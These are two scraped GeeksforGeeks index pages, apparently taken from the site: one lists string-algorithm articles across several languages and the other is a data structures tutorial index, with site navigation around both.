a string given number of times std::string::append vs std::string::push_back() vs Operator += in C++ Comparing two strings in C++ Convert string to char array in C++ Extract all integers from string in C++ std::regex_match, std::regex_replace() | Regex (Regular Expression) In C++ C program to Replace a word in a text by another given word stringstream in C++ and its applications C++ string class and its applications Strings in Java : String Class in Java String in Switch Case in Java Java program to swap first and last characters of words in a sentence Java program to expand a String if range is given? Check if a given string is a valid number (Integer or Floating Point) in Java | SET 2 (Regular Expression approach) Get the first letter of each word in a string using regex in Java Reverse words in a given String in Java Reverse a string in Java (5 Different Ways) Compare two strings lexicographically in Java Searching characters and substring in a String in Java Possible Words using given characters in Python Using Set() in Python Pangram Checking Using OrderedDict() in Python to check order of characters in string Print anagrams together in Python using List and Dictionary K’th Non-repeating Character in Python using List Comprehension and OrderedDict Prefix matching in Python using pytrie module Print number with commas as 1000 separators in Python Pattern Occurrences : Stack Implementation Java Strings in Python : String Methods in Python : Set 1 , Set 2 , Set 3 Dictionary and counter in Python to find winner of election Maximum length of consecutive 1’s in a binary string in Python using Map function Python code to print common characters of two Strings in alphabetical order Using Counter() in Python to find minimum character removal to make two strings anagram Reverse string in Python Python groupby method to remove all consecutive duplicates Generate two output strings depending upon occurrence of character in input string in Python Python Dictionary to find mirror characters in a string Python | Convert a list of characters into a string Map function and Lambda expression in Python to replace characters Zip function in Python to change to a new character set SequenceMatcher in Python for Longest Common Substring Python | Print the initials of a name with last name in full Python counter and dictionary intersection example (Make a string using deletion and rearrangement) Python program to count number of vowels using sets in given string Python set to check if string is panagram Python | Check if a Substring is Present in a Given String Python sorted() to check if two strings are anagram or not Python | Remove leading zeros from an IP address Python | Count all prefixes in given string with greatest frequency Check if both halves of the string have same set of characters in Python Concatenated string with uncommon characters in Python Second most repeated word in a sequence in Python Regex in Python to put spaces between words starting with capital letters Python code to move spaces to front of string in single traversal String slicing in Python to rotate a string String slicing in Python to check if a string can become empty by recursive deletion Reverse words in a given String in Python Run Length Encoding in Python Anagram checking in Python using collections.Counter() Remove all duplicates from a given string in Python Remove all consecutive duplicates from the string Python program to check if a string is palindrome or not Arthimetic Operation in String : Smallest number with sum of digits as N and divisible by 10^N Minimum sum of squares of character counts in a given string after removing k characters Maximum and minimum sums from two numbers with digit replacements Check if a given string is sum-string Sum of two large numbers Calculate sum of all numbers present in a string Extract maximum numeric value from a given string Calculate maximum value using ‘+’ or ‘*’ sign between two numbers in a string Maximum segment value after putting k breakpoints in a number Difference of two large numbers Check if a large number is divisible by 4 or not Check if a large number is divisible by 11 or not Number of substrings divisible by 6 in a string of integers Decimal representation of given binary string is divisible by 5 or not Number of substrings divisible by 8 but not by 3 To check divisibility of any large number by 999 Multiply Large Numbers represented as Strings Divide large number represented as string Remainder with 7 for large numbers Given two numbers as strings, find if one is a power of other Check whether a given number is even or odd Product of nodes at k-th level in a tree represented as string Program to find remainder when large number is divided by 11 Ways to remove one element from a binary string so that XOR becomes zero Find the maximum subarray XOR in a given array Calculate the difficulty of a sentence Minimum Index Sum for Common Elements of Two Lists Character Counting Based Problems : Count Uppercase, Lowercase, special character and numeric values Find the smallest window in a string containing all characters of another string Smallest window that contains all characters of string itself Count number of substrings with exactly k distinct characters Number of substrings with count of each character as k String with k distinct characters and no same characters adjacent Number of substrings of a string Distinct strings with odd and even changes allowed Find k’th character of decrypted string Count characters at same position as in English alphabets Count words in a given string Count words present in a string Count of words whose i-th letter is either (i-1)-th, i-th, or (i+1)-th letter of given word Program to find Smallest and Largest Word in a String Count substrings with same first and last characters Recursive solution to count substrings with same first and last characters Count of distinct substrings of a string using Suffix Array Count of distinct substrings of a string using Suffix Trie Count number of strings (made of R, G and B) using given combination Count of strings that can be formed using a, b and c under given constraints Count of substrings of a binary string containing K ones Group words with same set of characters Print all distinct characters of a string in order (3 Methods) Print common characters of two Strings in alphabetical order Common characters in n strings Find uncommon characters of the two strings Concatenated string with uncommon characters of two strings Program to remove vowels from a String Remove consecutive vowels from string Program to count vowels in a string (Iterative and Recursive) Count consonants in a string (Iterative and recursive methods) Alternate vowel and consonant string Given a binary string, count number of substrings that start and end with 1 Number of distinct permutation a String can have Time complexity of all permutations of a string Permutations of a given string using STL Check if both halves of the string have same set of characters Count words that appear exactly two times in an array of words Check if frequency of all characters can become same by one removal Check if a string has all characters with same frequency with one variation allowed Count ways to increase LCS length of two strings by one Find the character in first string that is present at minimum index in second string Remove characters from the first string which are present in the second string Length of Longest sub-string that can be removed Count of character pairs at same distance as in English alphabets Count number of equal pairs in a string Count of strings where adjacent characters are of difference one Print number of words, vowels and frequency of each character Subsequence & Substring : Longest subsequence where every character appears at-least k times Given two strings, find if first string is a subsequence of second Number of subsequences of the form a^i b^j c^k Number of subsequences in a string divisible by n Find number of times a string occurs as a subsequence in given string Number of subsequences as “ab” in a string repeated K times Count of ‘GFG’ Subsequences in the given string Count Distinct Subsequences Count distinct occurrences as a subsequence Longest common subsequence with permutations allowed Repeated subsequence of length 2 or more Print all longest common sub-sequences in lexicographical order Printing Longest Common Subsequence | Set 2 Given number as string, find number of contiguous subsequences which recursively add up to 9 | Set 2 Shortest Uncommon Subsequence Shortest Superstring Problem Printing Shortest Common Supersequence Shortest possible combination of two strings A Space Optimized Solution of LCS Sort a string according to the order defined by another string Shortest Common Supersequence Longest Repeating Subsequence Find largest word in dictionary by deleting some characters of given string Dynamic Programming | Set 12 (Longest Palindromic Subsequence) More >> Reverse & Rotation : Perfect reversible string Reversing an Equation Left Rotation and Right Rotation of a String Generate all rotations of a given string Minimum rotations required to get the same string Check if strings are rotations of each other or not Check if a string can be obtained by rotating another string 2 places Count rotations divisible by 4 Check if all rows of a matrix are circular rotations of each other Print reverse of a string using recursion Print words of a string in reverse order Program to reverse a string (Iterative and Recursive) Write a program to reverse an array or string Reverse an array without affecting special characters Reverse words in a given string Reverse individual words Reverse a string preserving space positions Reverse string without using any temporary variable Print reverse string after removing vowels Reverse vowels in a given string Reverse String according to the number of words Reverse each word in a linked list node Find if an array of strings can be chained to form a circle Sorting & Searching : Sort an array of strings according to string lengths Sorting array of strings (or words) using Trie Sort string of characters Alternate Lower Upper String Sort Program to sort string in descending order Print array of strings in sorted order without copying one string into another Sort the given string using character search Given a sorted dictionary of an alien language, find order of characters Rearrange a string in sorted order followed by the integer sum Print distinct sorted permutations with duplicates allowed in input Minimum cost to sort strings using reversal operations of different costs Print number in ascending order which contains 1, 2 and 3 in their digits. Search in an array of strings where non-empty strings are sorted Sparse Search Case Sensitive String : Lower case to upper case – An interesting fact isupper() and islower() and their application in C++ Case conversion (Lower to Upper and Vice Versa) of a string using BitWise operators in C/C++ Maximum distinct lowercase alphabets between two uppercase First uppercase letter in a string (Iterative and Recursive) Convert characters of a string to opposite case gOOGLE cASE of a given sentence Print all words matching a pattern in CamelCase Notation Dictonary Camel case of a given sentence Permute a string by changing case Toggle case of a string using Bitwise Operators How to design a tiny URL or URL shortener? Occurrence Based String : Given a string, find its first non-repeating character Print all permutations with repetition of characters Find the first non-repeating character from a stream of characters Convert to a string that is repetition of a substring of k length Smallest length string with repeated replacement of two distinct adjacent Distributing all balls without repetition Maximum consecutive repeating character in string Minimum number of deletions so that no two consecutive are same K’th Non-repeating Character Find repeated character present first in a string Find the first repeated word in a string Find the first repeated character in a string Second most repeated word in a sequence Most frequent word in an array of strings Efficiently find first repeated character in a string without using any additional data structure in one traversal Queries for characters in a repeated string Return maximum occurring character in an input string Generate two output strings depending upon occurrence of character in input string. Print characters and their frequencies in order of occurrence Program to count occurrence of a given character in a string Check if all occurrences of a character appear together Group all occurrences of characters according to first appearance Print the string by ignoring alternate occurrences of any character Print the string after the specified character has occurred given no. of times Find all occurrences of a given word in a matrix Replace all occurrences of string AB with C without using extra space Rearrange a binary string as alternate x and y occurrences Remove recurring digits in a given number Find the most frequent digit without using array/string Spacing : Remove spaces from a given string Move spaces to front of string in single traversal Put spaces between words starting with capital letters Removing spaces from a string using Stringstream Remove extra spaces from a string URLify a given string (Replace spaces is %20) String containing first letter of every word in a given string with spaces Print all possible strings that can be made by placing spaces Print all possible strings that can be made by placing spaces Anagram : Check whether two strings are anagram of each other Given a sequence of words, print all anagrams together | Set 2 Anagram Substring Search Print all pairs of anagrams in a given array of strings Remove minimum number of characters so that two strings become anagram Check if two strings are k-anagrams or not Check if binary representations of two numbers are anagram Given a sequence of words, print all anagrams together using STL Check if all levels of two trees are anagrams or not Count of total anagram substrings Minimum Number of Manipulations required to make two Strings Anagram Without Deletion of Character More >> Palindrome : C Program to Check if a Given String is Palindrome Check if a given string is a rotation of a palindrome C++ Program to print all palindromes in a given range Check if characters of a given string can be rearranged to form a palindrome Dynamic Programming | Set 28 (Minimum insertions to form a palindrome) Longest Palindromic Substring | Set 2 Find all palindromic sub-strings of a given string Online algorithm for checking palindrome in a stream Given a string, print all possible palindromic partitions Print all palindromic partitions of a string Dynamic Programming | Set 17 (Palindrome Partitioning) Count All Palindromic Subsequence in a given String Minimum characters to be added at front to make string palindrome Palindrome Substring Queries Suffix Tree Application 6 – Longest Palindromic Substring Palindrome pair in an array of words (or strings) Make largest palindrome by changing at most K-digits Lexicographically first palindromic string Recursive function to check if a string is palindrome Minimum number of Appends needed to make a string palindrome Longest Non-palindromic substring Minimum number of deletions to make a string palindrome Minimum steps to delete a string after repeated deletion of palindrome substrings Count of Palindromic substrings in an Index range Minimum insertions to form a palindrome with permutations allowed Nth Even length Palindrome More >> Binary String : Count of operations to make a binary string”ab” free Change if all bits can be made same by single flip Length of Longest sub-string that can be removed Number of flips to make binary string alternate 1’s and 2’s complement of a Binary Number Efficient method for 2’s complement of a binary string Count binary strings with k times appearing adjacent two set bits Count strings with consecutive 1’s Generate all binary strings from given pattern Add two bit strings Count number of binary strings without consecutive 1’s Generate all binary permutations such that there are more or equal 1’s than 0’s before every point in all permutations Check if a string follows a^nb^n pattern or not Binary representation of next number Binary representation of next greater number with same number of 1’s and 0’s Maximum difference of zeros and ones in binary string Check if a binary string has a 0 between 1s or not | Set 2 Min flips of continuous characters to make all characters same in a string Concatenation of two strings in PHP Program to add two binary strings Convert String into Binary Sequence Generate all binary strings without consecutive 1’s Minimum number of characters to be removed to make a binary string alternate Check divisibility of binary string by 2^k Removing elements between the two zeros Find i’th Index character in a binary string obtained after n iterations Number of substrings with odd decimal value in a binary string Generate n-bit Gray Codes Print N-bit binary numbers having more 1’s than 0’s in all prefixes Add n binary strings More >> Lexicographic pattern : Powet Set in Lexicographic order Lexicographically n-th permutation of string Lexicographic rank of string using stl Lexicographically minimum string rotation | Set 1 Generating distinct subsequences of a given string in lexicographic order Lexicographically smallest string obtained after concatenating array Lexicographical Maximum substring of string Lexicographical concatenation of all substrings of a string Construct lexicographically smallest palindrome Lexicographically smallest string whose hamming distance from given string is exactly K Lexicographically next string Lexicographically largest subsequence such that every character occurs at least k times Lexicographically first alternate vowel and consonant string Find a string in lexicographic order which is in between given two strings Print all permutations in sorted (lexicographic) order How to find Lexicographically previous permutation? Find n-th lexicographically permutation of a string | Set 2 Lexicographic rank of a string Pattern Searching : Searching for Patterns | Set 5 (Finite Automata) Pattern Searching | Set 7 (Boyer Moore Algorithm – Bad Character Heuristic) Manacher’s Algorithm – Linear Time Longest Palindromic Substring – Part 4 Z algorithm Search a Word in a 2D Grid of characters Printing string in plus ‘+’ pattern in the matrix Wildcard Pattern Matching Dynamic Programming | Wildcard Pattern Matching | Linear Time and Constant Space Replace a character c1 with c2 and c2 with c1 in a string S Aho-Corasick Algorithm Count of occurrences of a “1(0+)1” pattern in a string Find all the patterns of “1(0+)1” in a given string | SET 2 In-place replace multiple occurrences of a pattern Find all strings that match specific pattern in a dictionary Check if string follows order of characters defined by a pattern or not Find nth term of the Dragon Curve Sequence Count of number of given string in 2D character array More >> Split String : Tokenizing a string in C++ Split a sentence into words in C++ How to split a string in C/C++, Python and Java? Check if given string can be split into four distinct strings Split numeric, alphabetic and special symbols from a String Splitting a Numeric String Ways to split string such that each partition starts with distinct character Partition a number into two divisble parts Partition given string in such manner that i’th substring is sum of (i-1)’th and (i-2)’th substring Breaking a number such that first part is integral division of second by a power of 10 Divide a string in N equal parts Minimum Word Break Word Break Problem Word Break Problem using Backtracking Balance Parentheses & Bracket Evaluation : Identify and mark unmatched parenthesis in an expression Cost to Balance the parentheses Check for balanced parentheses in an expression | O(1) space Check for balanced parentheses in an expression Length of Longest Balanced Subsequence Balanced expression with replacement Evaluate a boolean expression represented as string Find maximum depth of nested parenthesis in a string Print all ways to break a string in bracket form Find an equal point in a string of brackets Minimum Swaps for Bracket Balancing Check if two expressions with brackets are same Expression contains redundant bracket or not Range Queries for Longest Correct Bracket Subsequence Evaluate an array expression with numbers, + and – Print Bracket Number Find index of closing bracket for a given opening bracket in an expression Binary tree to string with brackets Construct Binary Tree from String with bracket representation Minimum number of bracket reversals needed to make an expression balanced Conversion : Convert all substrings of length ‘k’ from base ‘b’ to decimal Convert Binary fraction to Decimal Convert decimal fraction to binary number Convert a sentence into its equivalent mobile numeric keypad sequence Check if it is possible to convert one string into another with given constraints Converting one string to other using append and delete last operations Converting Decimal Number lying between 1 to 3999 to Roman Numerals Converting Roman Numerals to Decimal lying between 1 to 3999 Inverting the Move to Front Transform Burrows – Wheeler Data Transform Algorithm Check if it is possible to transform one string to another Transform the string An in-place algorithm for String Transformation Ways of transforming one string to other by removing 0 or more characters Transform One String to Another using Minimum Number of Given Operation Convert Ternary Expression to a Binary Tree Prefix to Infix Conversion Prefix to Postfix Conversion Postfix to Prefix Conversion Postfix to Infix Misc : Word Wrap problem ( Space optimized solution ) Form minimum number from given sequence Maximum number of characters between any two same character in a string Print shortest path to print a string on screen Minimum number of stops from given path Check whether second string can be formed from characters of first string Mirror characters of a string Find words which are greater than given length k Find last index of a character in a string Find position of the given number among the numbers made of 4 and 7 Find winner of an election where votes are represented as candidate names Compare Version Numbers with large inputs allowed Possibility of moving out of maze Possibility of a word from a given set of characters Find the arrangement of queue at given time Program to generate all possible valid IP addresses from given string Program to validate an IP address Program to check for a Valid IMEI Number Decode a median string to the original string Decode a string recursively encoded as count followed by substring Minimal operations to make a number magical Program to check for ISBN Program for credit card number validation Maximize a number considering permutations with values smaller than limit Find if a string starts and ends with another given string More >> Quick Links : ‘Practice Problems’ on Strings ‘Quizzes’ on Strings If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Data Structures - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Data Structures A data structure is a particular way of organizing data in a computer so that it can be used effectively. For example, we can store a list of items having the same data-type using the array data structure. Array Data Structure This page contains detailed tutorials on different data structures (DS) with topic-wise problems. Topics: Array Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Matrix Misc Advanced Data Structure Overview: Overview of Data Structures | Set 1 (Linear Data Structures) Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash) Overview of Data Structures | Set 3 (Graph, Trie, Segment Tree and Suffix Tree) Abstract Data Types Linked List: Singly Linked List: Introduction to Linked List Linked List vs Array Linked List Insertion Linked List Deletion (Deleting a given key) Linked List Deletion (Deleting a key at given position) A Programmer’s approach of looking at Array vs. Linked List Find Length of a Linked List (Iterative and Recursive) How to write C functions that modify head pointer of a Linked List? Swap nodes in a linked list without swapping data Reverse a linked list Merge two sorted linked lists Merge Sort for Linked Lists Reverse a Linked List in groups of given size Detect and Remove Loop in a Linked List Add two numbers represented by linked lists | Set 1 Rotate a Linked List Generic Linked List in C Circular Linked List: Circular Linked List Introduction and Applications, Circular Singly Linked List Insertion< Circular Linked List Traversal Split a Circular Linked List into two halves Sorted insert for circular linked list Doubly Linked List: Doubly Linked List Introduction and Insertion Delete a node in a Doubly Linked List Reverse a Doubly Linked List The Great Tree-List Recursion Problem. QuickSort on Doubly Linked List Merge Sort for Doubly Linked List All Articles of Linked List Quiz on Linked List Coding Practice on Linked List Recent Articles on Linked List Stack: Introduction to Stack Infix to Postfix Conversion using Stack Evaluation of Postfix Expression Reverse a String using Stack Implement two stacks in an array Check for balanced parentheses in an expression Next Greater Element Reverse a stack using recursion Sort a stack using recursion The Stock Span Problem Design and Implement Special Stack Data Structure Implement Stack using Queues Design a stack with operations on middle element How to efficiently implement k stacks in a single array? Sort a stack using recursion Quiz on Stack All Articles on Stack Coding Practice on Stack Recent Articles on Stack Queue: Queue Introduction and Array Implementation Linked List Implementation of Queue Applications of Queue Data Structure Priority Queue Introduction Deque (Introduction and Applications) Implementation of Deque using circular array Implement Queue using Stacks Find the first circular tour that visits all petrol pumps Maximum of all subarrays of size k An Interesting Method to Generate Binary Numbers from 1 to n How to efficiently implement k Queues in a single array? Quiz on Queue All Articles on Queue Coding Practice on Queue Recent Articles on Queue Binary Tree: Binary Tree Introduction Binary Tree Properties Types of Binary Tree Handshaking Lemma and Interesting Tree Properties Enumeration of Binary Tree Applications of tree data structure Tree Traversals BFS vs DFS for Binary Tree Level Order Tree Traversal Diameter of a Binary Tree Inorder Tree Traversal without Recursion Inorder Tree Traversal without recursion and without stack! Threaded Binary Tree Maximum Depth or Height of a Tree If you are given two traversal sequences, can you construct the binary tree? Clone a Binary Tree with Random Pointers Construct Tree from given Inorder and Preorder traversals Maximum width of a binary tree Print nodes at k distance from root Print Ancestors of a given node in Binary Tree Check if a binary tree is subtree of another binary tree Connect nodes at same level Quiz on Binary Tree Quiz on Binary Tree Traversals All articles on Binary Tree Coding Practice on Binary Tree Recent Articles on Tree Binary Search Tree: Search and Insert in BST Deletion from BST Minimum value in a Binary Search Tree Inorder predecessor and successor for a given key in BST Check if a binary tree is BST or not Lowest Common Ancestor in a Binary Search Tree. Inorder Successor in Binary Search Tree Find k-th smallest element in BST (Order Statistics in BST) Merge two BSTs with limited extra space Two nodes of a BST are swapped, correct the BST Floor and Ceil from a BST In-place conversion of Sorted DLL to Balanced BST Find a pair with given sum in a Balanced BST Total number of possible Binary Search Trees with n keys Merge Two Balanced Binary Search Trees Binary Tree to Binary Search Tree Conversion Quiz on Binary Search Trees Quiz on Balanced Binary Search Trees All Articles on Binary Search Tree Coding Practice on Binary Search Tree Recent Articles on BST Heap: Binary Heap Why is Binary Heap Preferred over BST for Priority Queue? Binomial Heap Fibonacci Heap Heap Sort K’th Largest Element in an array Sort an almost sorted array/ Tournament Tree (Winner Tree) and Binary Heap All Articles on Heap Quiz on Heap Coding Practice on Heap Recent Articles on Heap Hashing: Hashing Introduction Separate Chaining for Collision Handling Open Addressing for Collision Handling Print a Binary Tree in Vertical Order Find whether an array is subset of another array Union and Intersection of two Linked Lists Find a pair with given sum Check if a given array contains duplicate elements within k distance from each other Find Itinerary from a given list of tickets Find number of Employees Under every Employee Quiz on Hashing All Articles on Hashing Coding Practice on Hashing Recent Articles on Hashing Graph: Introduction, DFS and BFS: Graph and its representations Breadth First Traversal for a Graph Depth First Traversal for a Graph Applications of Depth First Search Applications of Breadth First Traversal Detect Cycle in a Directed Graph Detect Cycle in a an Undirected Graph Detect cycle in an undirected graph Longest Path in a Directed Acyclic Graph Topological Sorting Check whether a given graph is Bipartite or not Snake and Ladder Problem Minimize Cash Flow among a given set of friends who have borrowed money from each other Boggle (Find all possible words in a board of characters) Assign directions to edges so that the directed graph remains acyclic All Articles on Graph Data Structure Quiz on Graph Quiz on Graph Traversals Quiz on Graph Shortest Paths Quiz on Graph Minimum Spanning Tree Coding Practice on Graph Recent Articles on Graph Advanced Data Structure: Advanced Lists: Memory efficient doubly linked list XOR Linked List – A Memory Efficient Doubly Linked List | Set 1 XOR Linked List – A Memory Efficient Doubly Linked List | Set 2 Skip List | Set 1 (Introduction) Self Organizing List | Set 1 (Introduction) Unrolled Linked List | Set 1 (Introduction) Segment Tree: Segment Tree | Set 1 (Sum of given range) Segment Tree | Set 2 (Range Minimum Query) Lazy Propagation in Segment Tree Persistent Segment Tree | Set 1 (Introduction) All articles on Segment Tree Trie: Trie | (Insert and Search) Trie | (Delete) Longest prefix matching – A Trie based solution in Java Print unique rows in a given boolean matrix How to Implement Reverse DNS Look Up Cache? How to Implement Forward DNS Look Up Cache? All Articles on Trie Binary Indexed Tree: Binary Indexed Tree Two Dimensional Binary Indexed Tree or Fenwick Tree Binary Indexed Tree : Range Updates and Point Queries Binary Indexed Tree : Range Update and Range Queries All Articles on Binary Indexed Tree Suffix Array and Suffix Tree: Suffix Array Introduction Suffix Array nLogn Algorithm kasai’s Algorithm for Construction of LCP array from Suffix Array Suffix Tree Introduction Ukkonen’s Suffix Tree Construction – Part 1 Ukkonen’s Suffix Tree Construction – Part 2 Ukkonen’s Suffix Tree Construction – Part 3 Ukkonen’s Suffix Tree Construction – Part 4, Ukkonen’s Suffix Tree Construction – Part 5 Ukkonen’s Suffix Tree Construction – Part 6 Generalized Suffix Tree Build Linear Time Suffix Array using Suffix Tree Substring Check Searching All Patterns Longest Repeated Substring, Longest Common Substring, Longest Palindromic Substring All Articles on Suffix Tree AVL Tree: AVL Tree | Set 1 (Insertion) AVL Tree | Set 2 (Deletion) AVL with duplicate keys Splay Tree: Splay Tree | Set 1 (Search) Splay Tree | Set 2 (Insert) B Tree: B-Tree | Set 1 (Introduction) B-Tree | Set 2 (Insert) B-Tree | Set 3 (Delete) Red-Black Tree: Red-Black Tree Introduction Red Black Tree Insertion. Red-Black Tree Deletion Program for Red Black Tree Insertion All Articles on Self-Balancing BSTs K Dimensional Tree: KD Tree (Search and Insert) K D Tree (Find Minimum) K D Tree (Delete) Others: Treap (A Randomized Binary Search Tree) Ternary Search Tree Interval Tree Implement LRU Cache Sort numbers stored on different machines Find the k most frequent words from a file Given a sequence of words, print all anagrams together Tournament Tree (Winner Tree) and Binary Heap Decision Trees – Fake (Counterfeit) Coin Puzzle (12 Coin Puzzle) Spaghetti Stack Data Structure for Dictionary and Spell Checker? Cartesian Tree Cartesian Tree Sorting Sparse Set Centroid Decomposition of Tree Gomory-Hu Tree Recent Articles on Advanced Data Structures. Array: Search, insert and delete in an unsorted array Search, insert and delete in a sorted array Write a program to reverse an array Leaders in an array Given an array A[] and a number x, check for pair in A[] with sum as x Majority Element Find the Number Occurring Odd Number of Times Largest Sum Contiguous Subarray Find the Missing Number Search an element in a sorted and pivoted array Merge an array of size n into another array of size m+n Median of two sorted arrays Program for array rotation Reversal algorithm for array rotation Block swap algorithm for array rotation Maximum sum such that no two elements are adjacent Sort elements by frequency | Set 1 Count Inversions in an array All Articles on Array Coding Practice on Array Quiz on Array Coding Practice on Array Recent Articles on Array Matrix: Search in a row wise and column wise sorted matrix Print a given matrix in spiral form A Boolean Matrix Question Print unique rows in a given boolean matrix Maximum size square sub-matrix with all 1s Print unique rows in a given boolean matrix Inplace M x N size matrix transpose | Updated Dynamic Programming | Set 27 (Maximum sum rectangle in a 2D matrix) Strassen’s Matrix Multiplication Create a matrix with alternating rectangles of O and X Print all elements in sorted order from row and column wise sorted matrix Given an n x n square matrix, find sum of all sub-squares of size k x k Count number of islands where every island is row-wise and column-wise separated Find a common element in all rows of a given row-wise sorted matrix All Articles on Matrix Coding Practice on Matrix Recent Articles on Matrix. Misc: Commonly Asked Data Structure Interview Questions | Set 1 A data structure for n elements and O(1) operations Expression Tree You can create a new DS topic and discuss it with other geeks using our portal PRACTICE. See recently added problems on Data Structures on PRACTICE. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

